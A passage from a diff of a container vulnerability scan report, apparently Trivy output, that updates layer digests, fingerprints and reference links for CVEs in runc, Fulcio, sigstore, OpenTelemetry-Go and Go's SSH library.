+│     │      │                  ├ [15]: https://github.com/opencontainers/runc/commit/3f925525b44d247e390e529e7
 │     │      │                  │       72a0dc0c0bc3557 
-│     │      │                  ├ [17]: https://github.com/opencontainers/runc/commit/435cc81be6b79cdec73b4002c
+│     │      │                  ├ [16]: https://github.com/opencontainers/runc/commit/435cc81be6b79cdec73b4002c
 │     │      │                  │       0dae549b2f6ae6d 
-│     │      │                  ├ [18]: https://github.com/opencontainers/runc/commit/44a0fcf685db051c80b8c2698
+│     │      │                  ├ [17]: https://github.com/opencontainers/runc/commit/44a0fcf685db051c80b8c2698
 │     │      │                  │       12bb177f5802c58 
-│     │      │                  ├ [19]: https://github.com/opencontainers/runc/commit/4b37cd93f86e72feac8664429
+│     │      │                  ├ [18]: https://github.com/opencontainers/runc/commit/4b37cd93f86e72feac8664429
 │     │      │                  │       88b549b5b7bf3e6 
-│     │      │                  ├ [20]: https://github.com/opencontainers/runc/commit/6fc191449109ea14bb7d61238
+│     │      │                  ├ [19]: https://github.com/opencontainers/runc/commit/6fc191449109ea14bb7d61238
 │     │      │                  │       f24a33fe08c651f 
-│     │      │                  ├ [21]: https://github.com/opencontainers/runc/commit/77889b56db939c323d29d1130
+│     │      │                  ├ [20]: https://github.com/opencontainers/runc/commit/77889b56db939c323d29d1130
 │     │      │                  │       f28f9aea2edb544 
-│     │      │                  ├ [22]: https://github.com/opencontainers/runc/commit/77d217c7c3775d8ca5af89e47
+│     │      │                  ├ [21]: https://github.com/opencontainers/runc/commit/77d217c7c3775d8ca5af89e47
 │     │      │                  │       7e81568ef4572db 
-│     │      │                  ├ [23]: https://github.com/opencontainers/runc/commit/a41366e74080fa9f26a2cd354
+│     │      │                  ├ [22]: https://github.com/opencontainers/runc/commit/a41366e74080fa9f26a2cd354
 │     │      │                  │       4e2801449697322 
-│     │      │                  ├ [24]: https://github.com/opencontainers/runc/commit/b3dd1bc562ed9996d1a0f249e
+│     │      │                  ├ [23]: https://github.com/opencontainers/runc/commit/b3dd1bc562ed9996d1a0f249e
 │     │      │                  │       056c16624046d28 
-│     │      │                  ├ [25]: https://github.com/opencontainers/runc/commit/d40b3439a9614a86e87b81a94
+│     │      │                  ├ [24]: https://github.com/opencontainers/runc/commit/d40b3439a9614a86e87b81a94
 │     │      │                  │       c6811ec6fa2d7d2 
-│     │      │                  ├ [26]: https://github.com/opencontainers/runc/commit/d61fd29d854b416feaaf128bf
+│     │      │                  ├ [25]: https://github.com/opencontainers/runc/commit/d61fd29d854b416feaaf128bf
 │     │      │                  │       650325cd2182165 
-│     │      │                  ├ [27]: https://github.com/opencontainers/runc/commit/db19bbed5348847da433faa9d
+│     │      │                  ├ [26]: https://github.com/opencontainers/runc/commit/db19bbed5348847da433faa9d
 │     │      │                  │       69e9f90192bfa64 
-│     │      │                  ├ [28]: https://github.com/opencontainers/runc/commit/ed6b1693b8b3ae7eb0250a7e7
+│     │      │                  ├ [27]: https://github.com/opencontainers/runc/commit/ed6b1693b8b3ae7eb0250a7e7
 │     │      │                  │       6fc888cdacf98c1 
-│     │      │                  ├ [29]: https://github.com/opencontainers/runc/commit/fdcc9d3cad2f85954a241ccb9
+│     │      │                  ├ [28]: https://github.com/opencontainers/runc/commit/fdcc9d3cad2f85954a241ccb9
 │     │      │                  │       10a61aaa1ef47f3 
-│     │      │                  ├ [30]: https://github.com/opencontainers/runc/commit/ff6fe1324663538167eca8b3d
+│     │      │                  ├ [29]: https://github.com/opencontainers/runc/commit/ff6fe1324663538167eca8b3d
 │     │      │                  │       3eec61e1bd4fa51 
-│     │      │                  ├ [31]: https://github.com/opencontainers/runc/commit/ff94f9991bd32076c871ef0ad
+│     │      │                  ├ [30]: https://github.com/opencontainers/runc/commit/ff94f9991bd32076c871ef0ad
 │     │      │                  │       8bc1b763458e480 
-│     │      │                  ├ [32]: https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h2
+│     │      │                  ├ [31]: https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h2
 │     │      │                  │       9p-rfm2 
-│     │      │                  ├ [33]: https://github.com/opencontainers/runc/security/advisories/GHSA-cgrx-mc
+│     │      │                  ├ [32]: https://github.com/opencontainers/runc/security/advisories/GHSA-cgrx-mc
 │     │      │                  │       8f-2prm 
-│     │      │                  ├ [34]: https://github.com/opencontainers/runc/security/advisories/GHSA-fh74-hm
+│     │      │                  ├ [33]: https://github.com/opencontainers/runc/security/advisories/GHSA-fh74-hm
 │     │      │                  │       69-rqjw 
-│     │      │                  ├ [35]: https://github.com/opencontainers/runc/security/advisories/GHSA-qw9x-cq
+│     │      │                  ├ [34]: https://github.com/opencontainers/runc/security/advisories/GHSA-qw9x-cq
 │     │      │                  │       r3-wc7r 
-│     │      │                  ├ [36]: https://github.com/opencontainers/selinux/pull/237 
-│     │      │                  ├ [37]: https://github.com/opencontainers/selinux/releases/tag/v1.13.0 
-│     │      │                  ├ [38]: https://linux.oracle.com/cve/CVE-2025-52881.html 
-│     │      │                  ├ [39]: https://linux.oracle.com/errata/ELSA-2025-23543.html 
-│     │      │                  ├ [40]: https://nvd.nist.gov/vuln/detail/CVE-2025-52881 
-│     │      │                  ├ [41]: https://pkg.go.dev/github.com/cyphar/filepath-securejoin/pathrs-lite/pr
+│     │      │                  ├ [35]: https://github.com/opencontainers/selinux/pull/237 
+│     │      │                  ├ [36]: https://github.com/opencontainers/selinux/releases/tag/v1.13.0 
+│     │      │                  ├ [37]: https://linux.oracle.com/cve/CVE-2025-52881.html 
+│     │      │                  ├ [38]: https://linux.oracle.com/errata/ELSA-2025-23543.html 
+│     │      │                  ├ [39]: https://nvd.nist.gov/vuln/detail/CVE-2025-52881 
+│     │      │                  ├ [40]: https://pkg.go.dev/github.com/cyphar/filepath-securejoin/pathrs-lite/pr
 │     │      │                  │       ocfs 
-│     │      │                  ├ [42]: https://ubuntu.com/security/notices/USN-7851-1 
-│     │      │                  ├ [43]: https://www.cve.org/CVERecord?id=CVE-2025-52881 
-│     │      │                  ├ [44]: https://youtu.be/tGseJW_uBB8 
-│     │      │                  ╰ [45]: https://youtu.be/y1PaBzxwRWQ 
+│     │      │                  ├ [41]: https://ubuntu.com/security/notices/USN-7851-1 
+│     │      │                  ├ [42]: https://www.cve.org/CVERecord?id=CVE-2025-52881 
+│     │      │                  ├ [43]: https://youtu.be/tGseJW_uBB8 
+│     │      │                  ╰ [44]: https://youtu.be/y1PaBzxwRWQ 
 │     │      ├ PublishedDate   : 2025-11-06T21:15:42.817Z 
 │     │      ╰ LastModifiedDate: 2026-06-17T09:37:12.35Z 
 │     ├ [6]  ╭ VulnerabilityID : CVE-2025-66506 
@@ -5846,14 +5442,14 @@
 │     │      ├ InstalledVersion: v1.7.1 
 │     │      ├ FixedVersion    : 1.8.3 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-66506 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:4a20d8374812c8283dd6e5bd1c93abdc2a2c5d792ffee52a816dbebf8cbcaf10 
+│     │      ├ Fingerprint     : sha256:881b2a6bab4fbd26fb369421376d688322d4c03ad2031af165d489726c37eb33 
 │     │      ├ Title           : github.com/sigstore/fulcio: Fulcio: Denial of Service via crafted OpenID
 │     │      │                   Connect (OIDC) token 
 │     │      ├ Description     : Fulcio is a free-to-use certificate authority for issuing code signing
@@ -5891,14 +5487,14 @@
 │     │      ├ InstalledVersion: v1.7.1 
 │     │      ├ FixedVersion    : 1.8.6 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-49478 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:93e3aa2ee24c453bedcc1e56d82bb4746c3444c68c78d25daff8754b3f8fd947 
+│     │      ├ Fingerprint     : sha256:46262613175922ebf4e83d644f5645d0bc39fdfe82a55c1eedf70d2edaeee851 
 │     │      ├ Title           : github.com/sigstore/fulcio: Fulcio: Server-Side Request Forgery and Kubernetes
 │     │      │                    ServiceAccount token leakage 
 │     │      ├ Description     : A flaw was found in Fulcio's OpenID Connect (OIDC) Discovery client. This
@@ -5931,14 +5527,14 @@
 │     │      ├ InstalledVersion: v1.7.1 
 │     │      ├ FixedVersion    : 1.8.5 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-22772 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:4942686f940c61fb5cea946cf740648ee8691ff312d89f9a925643fe359877a1 
+│     │      ├ Fingerprint     : sha256:66858f831b000dad8597cb8d9d730eeaedeb4ec02592ec0dd172f8a8d8cf29c2 
 │     │      ├ Title           : fulcio: Fulcio: Server-Side Request Forgery (SSRF) via unanchored regex in
 │     │      │                   MetaIssuer URL validation 
 │     │      ├ Description     : Fulcio is a certificate authority for issuing code signing certificates for an
@@ -5979,14 +5575,14 @@
 │     │      ├ InstalledVersion: v1.9.5 
 │     │      ├ FixedVersion    : 1.10.4 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-24137 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:450709a502d56741c15eaa7ccd28d17086661117254ae0f1bed72a75215f7626 
+│     │      ├ Fingerprint     : sha256:22f94cea1a6e5a41051fcd126146b615a395edc399ebe257c430d1ac196e2de2 
 │     │      ├ Title           : github.com/sigstore/sigstore: sigstore legacy TUF client allows for arbitrary
 │     │      │                   file writes with target cache path traversal 
 │     │      ├ Description     : sigstore framework is a common go library shared across sigstore services and
@@ -6034,14 +5630,14 @@
 │     │      ├ InstalledVersion: v1.39.0 
 │     │      ├ FixedVersion    : 1.41.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-29181 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Go 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-│     │      ├ Fingerprint     : sha256:f7986fd250e3d08725bf0a33d077ceac2f1f974e3856d7f0a1d4b0591e1d9981 
+│     │      ├ Fingerprint     : sha256:e0f13e5f4f4a285cbcab337015ea4a73fd202fba6945c8afbdc81b467cf9acb5 
 │     │      ├ Title           : github.com/open-telemetry/opentelemetry-go: OpenTelemetry-Go: Denial of
 │     │      │                   Service via crafted multi-value baggage headers 
 │     │      ├ Description     : OpenTelemetry-Go is the Go implementation of OpenTelemetry. From 1.36.0 to
@@ -6086,13 +5682,13 @@
 │     │      ├ InstalledVersion: v0.46.0 
 │     │      ├ FixedVersion    : 0.52.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39828 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:5136288205bb2662093365312241587ef3f06fd842c9ecc66fbc3f2a140a477d 
+│     │      ├ Fingerprint     : sha256:71b88d45f90fa2c4d5ee621e7aa9d152deb09ce0fbc21ea4bf7ce700c58b8c96 
 │     │      ├ Title           : golang.org/x/crypto/ssh: golang.org/x/crypto/ssh: Unauthorized command
 │     │      │                   execution via discarded SSH permissions 
 │     │      ├ Description     : When an SSH server authentication callback returned PartialSuccessError with
@@ -6167,13 +5763,13 @@
 │     │      ├ InstalledVersion: v0.46.0 
 │     │      ├ FixedVersion    : 0.52.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39829 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:5b98f53edefdb9c272d9282005d061b88d72b9d0303bc721cbe8d9b04c1695aa 
+│     │      ├ Fingerprint     : sha256:bc008479819ee4d2ae61258e462039e77855138fb2454f329e5ef2b2ffe863f6 
 │     │      ├ Title           : golang.org/x/crypto/ssh: golang.org/x/crypto/ssh: Denial of Service via
 │     │      │                   crafted public key with excessive parameters 
 │     │      ├ Description     : The RSA and DSA public key parsers did not enforce size limits on key
@@ -6240,38 +5836,35 @@
 │     │      │                  ├ [44]: https://access.redhat.com/security/cve/CVE-2026-39829 
 │     │      │                  ├ [45]: https://bugzilla.redhat.com/2480680 
 │     │      │                  ├ [46]: https://bugzilla.redhat.com/2480681 
-│     │      │                  ├ [47]: https://bugzilla.redhat.com/2480685 
-│     │      │                  ├ [48]: https://bugzilla.redhat.com/2480688 
-│     │      │                  ├ [49]: https://bugzilla.redhat.com/2480757 
-│     │      │                  ├ [50]: https://bugzilla.redhat.com/2480761 
-│     │      │                  ├ [51]: https://bugzilla.redhat.com/2493620 
-│     │      │                  ├ [52]: https://bugzilla.redhat.com/show_bug.cgi?id=2480680 
-│     │      │                  ├ [53]: https://bugzilla.redhat.com/show_bug.cgi?id=2480681 
-│     │      │                  ├ [54]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
-│     │      │                  ├ [55]: https://bugzilla.redhat.com/show_bug.cgi?id=2480688 
-│     │      │                  ├ [56]: https://bugzilla.redhat.com/show_bug.cgi?id=2480757 
-│     │      │                  ├ [57]: https://bugzilla.redhat.com/show_bug.cgi?id=2480761 
-│     │      │                  ├ [58]: https://bugzilla.redhat.com/show_bug.cgi?id=2493620 
-│     │      │                  ├ [59]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25681 
-│     │      │                  ├ [60]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27136 
-│     │      │                  ├ [61]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39829 
-│     │      │                  ├ [62]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39832 
-│     │      │                  ├ [63]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39835 
-│     │      │                  ├ [64]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42508 
-│     │      │                  ├ [65]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-57231 
-│     │      │                  ├ [66]: https://errata.almalinux.org/9/ALSA-2026-37123.html 
-│     │      │                  ├ [67]: https://errata.rockylinux.org/RLSA-2026:37123 
-│     │      │                  ├ [68]: https://go.dev/cl/781641 
-│     │      │                  ├ [69]: https://go.dev/cl/781661 
-│     │      │                  ├ [70]: https://go.dev/issue/79565 
-│     │      │                  ├ [71]: https://groups.google.com/g/golang-announce/c/a082jnz-LvI 
-│     │      │                  ├ [72]: https://linux.oracle.com/cve/CVE-2026-39829.html 
-│     │      │                  ├ [73]: https://linux.oracle.com/errata/ELSA-2026-37123.html 
-│     │      │                  ├ [74]: https://nvd.nist.gov/vuln/detail/CVE-2026-39829 
-│     │      │                  ├ [75]: https://pkg.go.dev/vuln/GO-2026-5018 
-│     │      │                  ├ [76]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-39829
+│     │      │                  ├ [47]: https://bugzilla.redhat.com/2480684 
+│     │      │                  ├ [48]: https://bugzilla.redhat.com/2480685 
+│     │      │                  ├ [49]: https://bugzilla.redhat.com/show_bug.cgi?id=2480680 
+│     │      │                  ├ [50]: https://bugzilla.redhat.com/show_bug.cgi?id=2480681 
+│     │      │                  ├ [51]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
+│     │      │                  ├ [52]: https://bugzilla.redhat.com/show_bug.cgi?id=2480688 
+│     │      │                  ├ [53]: https://bugzilla.redhat.com/show_bug.cgi?id=2480757 
+│     │      │                  ├ [54]: https://bugzilla.redhat.com/show_bug.cgi?id=2480761 
+│     │      │                  ├ [55]: https://bugzilla.redhat.com/show_bug.cgi?id=2493620 
+│     │      │                  ├ [56]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25681 
+│     │      │                  ├ [57]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27136 
+│     │      │                  ├ [58]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39829 
+│     │      │                  ├ [59]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39832 
+│     │      │                  ├ [60]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39835 
+│     │      │                  ├ [61]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42508 
+│     │      │                  ├ [62]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-57231 
+│     │      │                  ├ [63]: https://errata.almalinux.org/10/ALSA-2026-36199.html 
+│     │      │                  ├ [64]: https://errata.rockylinux.org/RLSA-2026:37123 
+│     │      │                  ├ [65]: https://go.dev/cl/781641 
+│     │      │                  ├ [66]: https://go.dev/cl/781661 
+│     │      │                  ├ [67]: https://go.dev/issue/79565 
+│     │      │                  ├ [68]: https://groups.google.com/g/golang-announce/c/a082jnz-LvI 
+│     │      │                  ├ [69]: https://linux.oracle.com/cve/CVE-2026-39829.html 
+│     │      │                  ├ [70]: https://linux.oracle.com/errata/ELSA-2026-37123.html 
+│     │      │                  ├ [71]: https://nvd.nist.gov/vuln/detail/CVE-2026-39829 
+│     │      │                  ├ [72]: https://pkg.go.dev/vuln/GO-2026-5018 
+│     │      │                  ├ [73]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-39829
 │     │      │                  │       .json 
-│     │      │                  ╰ [77]: https://www.cve.org/CVERecord?id=CVE-2026-39829 
+│     │      │                  ╰ [74]: https://www.cve.org/CVERecord?id=CVE-2026-39829 
 │     │      ├ PublishedDate   : 2026-05-22T04:16:22.31Z 
 │     │      ╰ LastModifiedDate: 2026-07-31T13:18:14.853Z 
 │     ├ [13] ╭ VulnerabilityID : CVE-2026-39830 
@@ -6283,13 +5876,13 @@
 │     │      ├ InstalledVersion: v0.46.0 
 │     │      ├ FixedVersion    : 0.52.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39830 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:6f5d00a2fd395fe1f5ad590e263aa0367ac6776e10b33ffe0dbc9c0bfe8612c5 
+│     │      ├ Fingerprint     : sha256:379c4119b9d595e58b6121f73a742319d8bf49afcb1609e6556aab9bcb15997a 
 │     │      ├ Title           : golang.org/x/crypto/ssh: golang.org/x/crypto/ssh: Denial of Service via
 │     │      │                   resource leak from unsolicited SSH responses 
 │     │      ├ Description     : A malicious SSH peer could send unsolicited global request responses to fill
@@ -6346,42 +5939,40 @@
 │     │      │                  ├ [35]: https://access.redhat.com/errata/RHSA-2026:47735 
 │     │      │                  ├ [36]: https://access.redhat.com/errata/RHSA-2026:48151 
 │     │      │                  ├ [37]: https://access.redhat.com/security/cve/CVE-2026-39830 
-│     │      │                  ├ [38]: https://bugzilla.redhat.com/2445356 
-│     │      │                  ├ [39]: https://bugzilla.redhat.com/2456333 
-│     │      │                  ├ [40]: https://bugzilla.redhat.com/2456338 
-│     │      │                  ├ [41]: https://bugzilla.redhat.com/2456339 
-│     │      │                  ├ [42]: https://bugzilla.redhat.com/2480681 
-│     │      │                  ├ [43]: https://bugzilla.redhat.com/2480684 
-│     │      │                  ├ [44]: https://bugzilla.redhat.com/show_bug.cgi?id=2445356 
-│     │      │                  ├ [45]: https://bugzilla.redhat.com/show_bug.cgi?id=2456333 
-│     │      │                  ├ [46]: https://bugzilla.redhat.com/show_bug.cgi?id=2456338 
-│     │      │                  ├ [47]: https://bugzilla.redhat.com/show_bug.cgi?id=2456339 
-│     │      │                  ├ [48]: https://bugzilla.redhat.com/show_bug.cgi?id=2480681 
-│     │      │                  ├ [49]: https://bugzilla.redhat.com/show_bug.cgi?id=2480684 
-│     │      │                  ├ [50]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25679 
-│     │      │                  ├ [51]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32280 
-│     │      │                  ├ [52]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32281 
-│     │      │                  ├ [53]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32283 
-│     │      │                  ├ [54]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39829 
-│     │      │                  ├ [55]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39830 
-│     │      │                  ├ [56]: https://errata.almalinux.org/9/ALSA-2026-29455.html 
-│     │      │                  ├ [57]: https://errata.rockylinux.org/RLSA-2026:29455 
-│     │      │                  ├ [58]: https://github.com/golang/crypto/commit/4e7a7384ecbc8d519f6f4c11b36fa9d
+│     │      │                  ├ [38]: https://bugzilla.redhat.com/2480680 
+│     │      │                  ├ [39]: https://bugzilla.redhat.com/2480681 
+│     │      │                  ├ [40]: https://bugzilla.redhat.com/2480684 
+│     │      │                  ├ [41]: https://bugzilla.redhat.com/2480685 
+│     │      │                  ├ [42]: https://bugzilla.redhat.com/show_bug.cgi?id=2445356 
+│     │      │                  ├ [43]: https://bugzilla.redhat.com/show_bug.cgi?id=2456333 
+│     │      │                  ├ [44]: https://bugzilla.redhat.com/show_bug.cgi?id=2456338 
+│     │      │                  ├ [45]: https://bugzilla.redhat.com/show_bug.cgi?id=2456339 
+│     │      │                  ├ [46]: https://bugzilla.redhat.com/show_bug.cgi?id=2480681 
+│     │      │                  ├ [47]: https://bugzilla.redhat.com/show_bug.cgi?id=2480684 
+│     │      │                  ├ [48]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25679 
+│     │      │                  ├ [49]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32280 
+│     │      │                  ├ [50]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32281 
+│     │      │                  ├ [51]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32283 
+│     │      │                  ├ [52]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39829 
+│     │      │                  ├ [53]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39830 
+│     │      │                  ├ [54]: https://errata.almalinux.org/10/ALSA-2026-36199.html 
+│     │      │                  ├ [55]: https://errata.rockylinux.org/RLSA-2026:29455 
+│     │      │                  ├ [56]: https://github.com/golang/crypto/commit/4e7a7384ecbc8d519f6f4c11b36fa9d
 │     │      │                  │       761fc8946 
-│     │      │                  ├ [59]: https://go.dev/cl/781640 
-│     │      │                  ├ [60]: https://go.dev/cl/781664 
-│     │      │                  ├ [61]: https://go.dev/issue/79564 
-│     │      │                  ├ [62]: https://groups.google.com/g/golang-announce/c/a082jnz-LvI 
-│     │      │                  ├ [63]: https://linux.oracle.com/cve/CVE-2026-39830.html 
-│     │      │                  ├ [64]: https://linux.oracle.com/errata/ELSA-2026-37072.html 
-│     │      │                  ├ [65]: https://nvd.nist.gov/vuln/detail/CVE-2026-39830 
-│     │      │                  ├ [66]: https://pkg.go.dev/vuln/GO-2026-5017 
-│     │      │                  ├ [67]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-39830
+│     │      │                  ├ [57]: https://go.dev/cl/781640 
+│     │      │                  ├ [58]: https://go.dev/cl/781664 
+│     │      │                  ├ [59]: https://go.dev/issue/79564 
+│     │      │                  ├ [60]: https://groups.google.com/g/golang-announce/c/a082jnz-LvI 
+│     │      │                  ├ [61]: https://linux.oracle.com/cve/CVE-2026-39830.html 
+│     │      │                  ├ [62]: https://linux.oracle.com/errata/ELSA-2026-37072.html 
+│     │      │                  ├ [63]: https://nvd.nist.gov/vuln/detail/CVE-2026-39830 
+│     │      │                  ├ [64]: https://pkg.go.dev/vuln/GO-2026-5017 
+│     │      │                  ├ [65]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-39830
 │     │      │                  │       .json 
-│     │      │                  ├ [68]: https://ubuntu.com/security/notices/USN-8447-1 
-│     │      │                  ├ [69]: https://ubuntu.com/security/notices/USN-8447-2 
-│     │      │                  ├ [70]: https://ubuntu.com/security/notices/USN-8447-3 
-│     │      │                  ╰ [71]: https://www.cve.org/CVERecord?id=CVE-2026-39830 
+│     │      │                  ├ [66]: https://ubuntu.com/security/notices/USN-8447-1 
